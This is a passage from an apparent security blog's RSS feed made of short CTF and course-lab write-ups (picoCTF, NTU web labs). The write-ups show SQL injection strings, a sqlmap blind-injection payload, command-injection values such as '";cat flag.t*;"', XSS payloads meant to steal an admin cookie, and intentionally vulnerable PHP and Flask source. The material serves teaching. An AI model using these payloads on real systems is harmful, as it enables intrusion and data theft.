style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">213&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
 PicoCTF - Some Assembly Required 3
 &lt;a class="anchor" href="#picoctf---some-assembly-required-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c
&lt;/code>&lt;/pre>&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler rTEuOmSfG3.js&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">&amp;#39;use strict&amp;#39;;
const str_list = [&amp;#34;exports&amp;#34;, &amp;#34;270328ewawLo&amp;#34;, &amp;#34;instantiate&amp;#34;, &amp;#34;1OsuamQ&amp;#34;, &amp;#34;Incorrect!&amp;#34;, &amp;#34;length&amp;#34;, &amp;#34;copy_char&amp;#34;, &amp;#34;value&amp;#34;, &amp;#34;1512517ESezaM&amp;#34;, &amp;#34;innerHTML&amp;#34;, &amp;#34;check_flag&amp;#34;, &amp;#34;result&amp;#34;, &amp;#34;1383842SQRPPf&amp;#34;, &amp;#34;924408cukzgO&amp;#34;, &amp;#34;getElementById&amp;#34;, &amp;#34;418508cLDohp&amp;#34;, &amp;#34;input&amp;#34;, &amp;#34;Correct!&amp;#34;, &amp;#34;573XsMMHp&amp;#34;, &amp;#34;arrayBuffer&amp;#34;, &amp;#34;183RUQBDE&amp;#34;, &amp;#34;38934oMACea&amp;#34;];
const tranfer_fn = function(url, whensCollection) {
 /** @type {number} */
 url = url - 285;
 let _0x143f7d = str_list[url];
 return _0x143f7d;
};
(function(data, oldPassword) {
 const tranfer_fn = tranfer_fn;
 for (; !![];) {
 try {
 const userPsd = -parseInt(&amp;#34;length&amp;#34;) + -parseInt(&amp;#34;573XsMMHp&amp;#34;) + -parseInt(&amp;#34;innerHTML&amp;#34;) * -parseInt(&amp;#34;getElementById&amp;#34;) + -parseInt(&amp;#34;38934oMACea&amp;#34;) + parseInt(&amp;#34;value&amp;#34;) + -parseInt(&amp;#34;Incorrect!&amp;#34;) * -parseInt(&amp;#34;instantiate&amp;#34;) + parseInt(&amp;#34;arrayBuffer&amp;#34;);
 if (userPsd === oldPassword) {
 break;
 } else {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 } catch (_0x289152) {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 }
})(str_list, 970828);
let exports;
(async() =&amp;gt; {
 const tranfer_fn = tranfer_fn;
 let rpm_traffic = await fetch(&amp;#34;./qCCYI0ajpD&amp;#34;);
 let m = await WebAssembly[&amp;#34;1512517ESezaM&amp;#34;](await rpm_traffic[&amp;#34;1OsuamQ&amp;#34;]());
 let updatedEdgesById = m[&amp;#34;instance&amp;#34;];
 exports = updatedEdgesById[&amp;#34;copy_char&amp;#34;];
})();
/**
 * @return {undefined}
 */
function onButtonPress() {
 const tranfer_fn = tranfer_fn;
 let data = document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;exports&amp;#34;)[&amp;#34;924408cukzgO&amp;#34;];
 for (let i = 0; i &amp;lt; data[&amp;#34;result&amp;#34;]; i++) {
 exports[&amp;#34;1383842SQRPPf&amp;#34;](data[&amp;#34;charCodeAt&amp;#34;](i), i);
 }
 exports[&amp;#34;1383842SQRPPf&amp;#34;](0, data[&amp;#34;result&amp;#34;]);
 if (exports[&amp;#34;input&amp;#34;]() == 1) {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;418508cLDohp&amp;#34;] = &amp;#34;270328ewawLo&amp;#34;;
 } else {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;innerHTML&amp;#34;] = &amp;#34;check_flag&amp;#34;;
 }
}
;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
 PicoCTF - SQLiLite
 &lt;a class="anchor" href="#picoctf---sqlilite">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://saturn.picoctf.net:55837/">http://saturn.picoctf.net:55837/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - sqli
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;p>Payload:
&lt;code>admin' or '1'='1' -- #&lt;/code>
&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
 PicoCTF - Super Serial
 &lt;a class="anchor" href="#picoctf---super-serial">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/B1I5n1pns">php unserialization&lt;/a>&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>The flag is at ../flag&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化&lt;/p>
&lt;ol>
&lt;li>
&lt;p>robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是&lt;code>sqli&lt;/code>，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且&lt;code>/admin.phps&lt;/code>沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
&lt;img src="https://hackmd.io/_uploads/BkcThh0Pn.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>index.phps
用index.phps查看source code發現有一些其他怪東西，包括&lt;code>authentication.phps&lt;/code>和&lt;code>cookie.php&lt;/code>
:::spoiler Real Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
require_once(&amp;#34;cookie.php&amp;#34;);

if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#34;pass&amp;#34;])){
 $con = new SQLite3(&amp;#34;../users.db&amp;#34;);
 $username = $_POST[&amp;#34;user&amp;#34;];
 $password = $_POST[&amp;#34;pass&amp;#34;];
 $perm_res = new permissions($username, $password);
 if ($perm_res-&amp;gt;is_guest() || $perm_res-&amp;gt;is_admin()) {
 setcookie(&amp;#34;login&amp;#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &amp;#34;/&amp;#34;);
 header(&amp;#34;Location: authentication.php&amp;#34;);
 die();
 } else {
 $msg = &amp;#39;&amp;lt;h6 class=&amp;#34;text-center&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;Invalid Login.&amp;lt;/h6&amp;gt;&amp;#39;;
 }
}
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;link href=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; integrity=&amp;#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;
&amp;lt;link href=&amp;#34;style.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
&amp;lt;script src=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&amp;#34; integrity=&amp;#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;col-sm-9 col-md-7 col-lg-5 mx-auto&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card card-signin my-5&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
 &amp;lt;h5 class=&amp;#34;card-title text-center&amp;#34;&amp;gt;Sign In&amp;lt;/h5&amp;gt;
 &amp;lt;?php if (isset($msg)) echo $msg; ?&amp;gt;
 &amp;lt;form class=&amp;#34;form-signin&amp;#34; action=&amp;#34;index.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user&amp;#34; name=&amp;#34;user&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Username&amp;#34; required autofocus&amp;gt;
 &amp;lt;label for=&amp;#34;user&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;pass&amp;#34; name=&amp;#34;pass&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Password&amp;#34; required&amp;gt;
 &amp;lt;label for=&amp;#34;pass&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;button class=&amp;#34;btn btn-lg btn-primary btn-block text-uppercase&amp;#34; type=&amp;#34;submit&amp;#34;&amp;gt;Sign in&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
 PicoCTF - Who are you?
 &lt;a class="anchor" href="#picoctf---who-are-you">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="chrome-85-更新淺談-referer-policy-和更新影響">
 &lt;a href="https://www.maxlist.xyz/2020/08/03/chrome-85-referer-policy/">【Chrome 85 更新】淺談 Referer-Policy 和更新影響&lt;/a>
 &lt;a class="anchor" href="#chrome-85-%e6%9b%b4%e6%96%b0%e6%b7%ba%e8%ab%87-referer-policy-%e5%92%8c%e6%9b%b4%e6%96%b0%e5%bd%b1%e9%9f%bf">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;h3 id="http-referer-是什麼">
 HTTP Referer 是什麼?
 &lt;a class="anchor" href="#http-referer-%e6%98%af%e4%bb%80%e9%ba%bc">#&lt;/a>
&lt;/h3>
&lt;p>當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。&lt;/p>
&lt;p>舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 &lt;a href="https://ithelp.ithome.com.tw/">https://ithelp.ithome.com.tw/&lt;/a> 的網址。&lt;/p>&lt;/blockquote>
&lt;h3 id="rfc-2616---date">
 &lt;a href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.18">RFC 2616 - Date&lt;/a>
 &lt;a class="anchor" href="#rfc-2616---date">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>The Date general-header field represents the date and time at which
the message was originated, having the same semantics as orig-date in
RFC 822. The field value is an HTTP-date, as described in section
3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
 Simple Web - 0x02(Lab - Whois Tool)
 &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://whoistool.ctf.zoolab.org/">https://whoistool.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Almost the same as &lt;a href="https://bernie6401.github.io/7x0Gr0C_QEahfS_QaTLYTg">0x10(Lab - DNS Lookup Tool | WAF)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if(isset($_GET[&amp;#34;host&amp;#34;])){
 $host = $_GET[&amp;#34;host&amp;#34;];
 if(strlen($host) &amp;gt; 15)
 echo &amp;#34;Host name tooooooo logn!!&amp;#34;;
 else
 echo `whois &amp;#34;{$host}&amp;#34; 2&amp;gt;&amp;amp;1;`;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
&lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
 Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
 &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---sqli">
 Exploit - SQLi
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;h3 id="easy-way---sqlmap">
 Easy way - &lt;code>SQLmap&lt;/code>
 &lt;a class="anchor" href="#easy-way---sqlmap">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./sqlmap.py &amp;#34;https://login.ctf.zoolab.org/&amp;#34; --form -dbs sqlite --dump --risk=3 --level=5
...
---
Parameter: username (POST)
 Type: time-based blind
 Title: SQLite &amp;gt; 2.0 AND time-based blind (heavy query)
 Payload: username=&amp;#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||&amp;#39;&amp;amp;password=
---
&lt;/code>&lt;/pre>&lt;h3 id="hard-way---tryerror">
 Hard way - try&amp;amp;error
 &lt;a class="anchor" href="#hard-way---tryerror">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Check if it has &lt;code>sqli&lt;/code> problem
Payload: &lt;code>union'&lt;/code>
&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
 Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
 &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config[&amp;#34;SQLALCHEMY_DATABASE_URI&amp;#34;] = &amp;#34;sqlite:///app.db&amp;#34;
db.init_app(app)

with app.app_context():
 db.session.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS users(
 id Integer PRIMARY KEY,
 username String NOT NULL UNIQUE,
 password String,
 count Integer DEFAULT 0
 );
 &amp;#34;&amp;#34;&amp;#34;)
 db.session.execute(&amp;#34;INSERT OR REPLACE INTO users (username, password) VALUES (&amp;#39;admin&amp;#39;, &amp;#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&amp;#39;)&amp;#34;)
 db.session.commit()

def login(greet):
 if not greet:
 return send_file(&amp;#39;app.py&amp;#39;, mimetype=&amp;#39;text/plain&amp;#39;)
 else:
 return render_template_string(f&amp;#34;Hello {greet}&amp;#34;)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def index():
 if request.method == &amp;#34;GET&amp;#34;:
 return render_template(&amp;#39;index.html&amp;#39;)
 else:
 username = request.form.get(&amp;#39;username&amp;#39;, &amp;#39;&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;, &amp;#39;&amp;#39;)
 error = &amp;#39;&amp;#39;
 user = db.session.execute(&amp;#34;SELECT username, password FROM users where username=:username&amp;#34;, {&amp;#34;username&amp;#34;:username}).first()

 if user and user[1] == password:
 return login(request.form.get(&amp;#39;greet&amp;#39;, &amp;#39;&amp;#39;))
 elif not user:
 error += &amp;#34;User doesn&amp;#39;t exist! &amp;#34;

 # New feature! count login failed event
 db.session.execute(&amp;#34;UPDATE users SET count = count + 1 WHERE username=:username&amp;#34;, {&amp;#34;username&amp;#34;: username})
 db.session.commit()
 count = db.session.execute(f&amp;#34;SELECT * FROM users WHERE username=&amp;#39;{username}&amp;#39;&amp;#34;).first() or [0, 0, 0, 0]
 error += f&amp;#39;Login faild count: {count[3]}&amp;#39;

 return render_template(&amp;#39;index.html&amp;#39;, error=error)


if __name__ == &amp;#34;__main__&amp;#34;:
 app.run(host=&amp;#34;0.0.0.0&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
 Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
 &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://particles.ctf.zoolab.org">https://particles.ctf.zoolab.org&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>The website can change the theme of layout. The main goal is to leak admin&amp;rsquo;s cookie.&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---xss">
 Exploit - XSS
 &lt;a class="anchor" href="#exploit---xss">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use burp suit to check if the website has XSS vulnerability.
&lt;img src="https://i.imgur.com/eu4Qqrs.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Try to modify &lt;code>config&lt;/code> parameter
Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
:::spoiler Response 1&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 url.value = location; config.value = &amp;#39;1;
 alert(123);
 console.log({x://\&amp;#39;; fetch(&amp;#39;/1;alert(123);console.log({x://\.json&amp;#39;).then(r =&amp;gt; r.json()).then(json =&amp;gt; {
 particlesJS(&amp;#34;particles-js&amp;#34;, json)
 })
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>:::
or
Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
 Simple Web - 0x09(Lab - Simple Note)
 &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://note.ctf.zoolab.org/">https://note.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.wibibi.com/info.php?tid=402">&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const id = location.pathname.split(&amp;#39;/&amp;#39;).pop();

 fetch(`/api/note/${id}`).then(r =&amp;gt; r.json()).then(({ title, content })=&amp;gt;{
 url.value = location;
 titleNode.innerHTML = title;
 contentNode.innerText = content;
 }); 
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
&lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
 Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9000/">http://h4ck3r.quest:9000/&lt;/a>&lt;/p>
&lt;h2 id="exploit---gitleak--basic-git-command">
 Exploit - gitleak + basic Git command
 &lt;a class="anchor" href="#exploit---gitleak--basic-git-command">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the extension of Firefox(or Google), &lt;code>Dotgit&lt;/code>, to check if the website actually has &lt;code>git leak problem&lt;/code>
&lt;img src="https://i.imgur.com/ZtMbj9z.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>denny0223/scrabble
To use scrabble tool to leak information&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/denny0223/scrabble.git
$ cd scrabble
$ sudo ./scrabble http://h4ck3r.quest:9000/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Still no flag
